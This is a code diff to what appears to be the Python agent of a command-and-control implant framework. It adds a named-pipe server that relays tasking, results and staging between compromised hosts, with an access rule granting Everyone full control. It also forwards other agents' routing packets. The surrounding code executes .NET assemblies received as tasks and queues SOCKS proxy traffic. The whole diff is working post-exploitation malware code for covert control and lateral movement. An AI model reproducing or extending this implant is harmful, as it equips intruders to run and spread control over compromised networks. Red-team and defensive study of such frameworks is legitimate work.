@@ -114,8 +114,7 @@ def decode_routing_packet(data):
             # if meta == 'SERVER_RESPONSE':
             process_tasking(encData)
         else:
-            # TODO: how to handle forwarding on other agent routing packets?
-            pass
+            smb_server_queue.Enqueue(base64.b64encode(data).decode('UTF-8'))
 
 
 def build_response_packet(taskingID, packetData, resultID=0):
@@ -445,7 +444,6 @@ def process_packet(packetType, data, resultID):
 
             strmprop = assembly.GetType("Task").GetProperty("OutputStream")
             if not strmprop:
-                print("no output pipe")
                 results = (
                     assembly.GetType("Task").GetMethod("Execute").Invoke(None, params)
                 )
@@ -465,7 +463,6 @@ def process_packet(packetType, data, resultID):
                     )
                     pipeClientStream.Dispose()
 
-                print("output pipe")
                 clr.AddReference("System.Core")
                 import System.IO.HandleInheritability
                 import System.IO.Pipes
@@ -572,6 +569,84 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 61:
         _socksqueue.put(base64.b64decode(data.encode("UTF-8")))
+
+    elif packetType == 70:
+        # Pipe Server
+        import sys
+        import threading
+        import time
+
+        import clr
+        clr.AddReference('System.Core')
+        import System.IO.HandleInheritability
+        clr.AddReference("System.IO.Pipes")
+        import System.Collections.Generic
+        import System.IO.Pipes
+        from System.IO.Pipes import (
+            NamedPipeServerStream,
+            PipeAccessRights,
+            PipeAccessRule,
+            PipeDirection,
+            PipeSecurity,
+            PipeTransmissionMode,
+        )
+        from System.Security.AccessControl import AccessControlType
+
+        parts = data.split("|")
+        hop_name = parts[0]
+        pipe_name = parts[1]
+
+        def pipe_data_server(pipe_server, hop_name):
+            while True:
+                time.sleep(1)
+                pipe_reader = System.IO.StreamReader(pipe_server)
+                received_data = pipe_reader.ReadLine()
+                try:
+                    if received_data[0] == '0':
+                        response = send_results_for_child(received_data)
+                    elif received_data[0] == '1':
+                        response = send_get_tasking_for_child(received_data)
+                    elif received_data[0] == '2':
+                        response = send_staging_for_child(received_data, hop_name)
+
+                    try:
+                        pipe_writer = System.IO.StreamWriter(pipe_server)
+                        response = base64.b64encode(response).decode('UTF-8')
+                        pipe_writer.WriteLine(response)
+                        pipe_writer.Flush()
+                    except:
+                        pass
+
+                    try:
+                        while smb_server_queue.Count > 0:
+                            response = smb_server_queue.Peek()
+                            smb_server_queue.Dequeue()
+                            pipe_writer = System.IO.StreamWriter(pipe_server)
+                            pipe_writer.WriteLine(response)
+                            pipe_writer.Flush()
+                    except:
+                        pass
+
+                except Exception as e:
+                    print(e)
+                    break
+
+        def server_thread_function(pipe_name, hop_name):
+            security = PipeSecurity()
+            rule = PipeAccessRule('Everyone', PipeAccessRights.FullControl, AccessControlType.Allow)
+            security.AddAccessRule(rule)
+
+            while True:
+                pipe_server = NamedPipeServerStream(pipe_name, PipeDirection.InOut, 10, PipeTransmissionMode.Message,
+                                                    0, 1024, 1024, security)
+                pipe_server.WaitForConnection()
+                pipe_data_server(pipe_server, hop_name)
+                pipe_server.Dispose()
+                time.sleep(1)
+
+        server_thread = KThread(target=server_thread_function, args=(pipe_name, hop_name,))
+        server_thread.daemon = True
+        server_thread.start()
 
     elif packetType == 100:
         # dynamic code execution, wait for output, don't save output
@@ -1508,7 +1583,7 @@ while True:
                     0, str("[!] Failed to check job buffer!: " + str(e))
                 )
                 process_job_tasking(result)
-            if data.strip() == defaultResponse.strip():
+            if data.strip() == defaultResponse.strip() or data == base64.b64encode(defaultResponse):
                 missedCheckins = 0
             else:
                 decode_routing_packet(data)
